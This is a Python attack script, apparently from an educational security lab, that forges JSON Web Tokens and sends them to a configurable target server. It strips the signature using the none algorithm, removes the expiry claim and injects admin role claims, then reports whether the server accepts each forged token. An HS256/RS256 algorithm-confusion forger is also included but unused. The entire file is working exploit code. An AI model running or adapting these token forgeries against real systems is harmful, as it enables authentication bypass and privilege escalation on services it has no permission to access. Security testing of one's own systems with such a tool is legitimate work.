"""
JWT Tampering Attack Script
============================
Demonstrates four classic JWT attacks:
  1. None algorithm — strip signature, change alg to "none"
  2. Algorithm confusion (HS/RS) — sign with RS256 public key using HS256
  3. Expiration removal — delete exp claim
  4. Payload tampering — change role/is_admin without valid signature

Usage:
    TARGET_URL=http://localhost:8000 python offensive/jwt_tamper.py
"""
import asyncio
import base64
import hashlib
import hmac
import json
import os

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()
BASE_URL = os.getenv("TARGET_URL", "http://localhost:8000")


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(data: bytes | str) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt_parts(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


# ── Attack 1: None algorithm ──────────────────────────────────────────────────

def attack_none_alg(token: str) -> str:
    header, payload, _ = decode_jwt_parts(token)
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")))
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{new_header}.{new_payload}."  # empty signature


# ── Attack 2: Algorithm confusion ────────────────────────────────────────────

def attack_alg_confusion(token: str, public_key_pem: str) -> str:
    """Sign with public key as HMAC-SHA256 secret — exploits alg confusion."""
    header, payload, _ = decode_jwt_parts(token)
    header["alg"] = "HS256"
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")))
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")))
    signing_input = f"{new_header}.{new_payload}".encode()
    sig = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{new_header}.{new_payload}.{b64url_encode(sig)}"


# ── Attack 3: Expiration removal ─────────────────────────────────────────────

def attack_exp_removal(token: str) -> str:
    header, payload, _ = decode_jwt_parts(token)
    payload.pop("exp", None)
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")))
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")))
    # Keep original signature (will be invalid if content changed, but tests if exp is checked)
    original_sig = token.split(".")[2]
    return f"{new_header}.{new_payload}.{original_sig}"


# ── Attack 4: Payload tampering ───────────────────────────────────────────────

def attack_role_tamper(token: str) -> str:
    """Change role to admin and is_admin to True — tests signature verification."""
    header, payload, _ = decode_jwt_parts(token)
    payload["role"] = "admin"
    payload["roles"] = ["admin"]
    payload["is_admin"] = True
    new_header = b64url_encode(json.dumps(header, separators=(",", ":")))
    new_payload = b64url_encode(json.dumps(payload, separators=(",", ":")))
    original_sig = token.split(".")[2]  # Invalid sig — tests if server checks it
    return f"{new_header}.{new_payload}.{original_sig}"


async def test_token(client: httpx.AsyncClient, token: str) -> int:
    resp = await client.get(
        f"{BASE_URL}/api/users/1/profile",
        headers={"Authorization": f"Bearer {token}"},
    )
    return resp.status_code


async def run():
    console.print(Panel.fit(
        f"[bold red]JWT Tampering Attack Suite[/]\nTarget: {BASE_URL}\n"
        "Tests 4 JWT attack vectors against the current mode.",
        title="[red]OFFENSIVE TOOL — EDUCATIONAL USE ONLY[/]"
    ))

    async with httpx.AsyncClient() as client:
        # Get a valid token
        resp = await client.post(
            f"{BASE_URL}/auth/login",
            json={"username": "user1", "password": "password1"},
        )
        if resp.status_code != 200:
            console.print(f"[red]Login failed: {resp.text}[/]")
            return

        valid_token = resp.json()["access_token"]
        valid_status = await test_token(client, valid_token)
        console.print(f"[green][+] Valid token status: HTTP {valid_status}[/]\n")

        # Decode and display original
        h, p, _ = decode_jwt_parts(valid_token)
        console.print("[dim]Original header:[/]", json.dumps(h))
        console.print("[dim]Original payload:[/]", json.dumps(p, default=str))
        console.print()

        attacks = [
            ("None Algorithm", attack_none_alg(valid_token)),
            ("Exp Removal", attack_exp_removal(valid_token)),
            ("Role Tamper", attack_role_tamper(valid_token)),
        ]

        table = Table(title="JWT Attack Results", show_lines=True)
        table.add_column("Attack", style="red")
        table.add_column("HTTP Status", justify="center")
        table.add_column("Result", style="bold")
        table.add_column("Notes")

        for name, tampered_token in attacks:
            status = await test_token(client, tampered_token)
            if status == 200:
                result = "[red]ACCEPTED — VULNERABLE[/]"
                note = "Server did not validate token properly"
            elif status == 401:
                result = "[green]REJECTED — SECURE[/]"
                note = "Token validation working"
            else:
                result = f"HTTP {status}"
                note = ""
            table.add_row(name, str(status), result, note)

        console.print(table)


if __name__ == "__main__":
    asyncio.run(run())
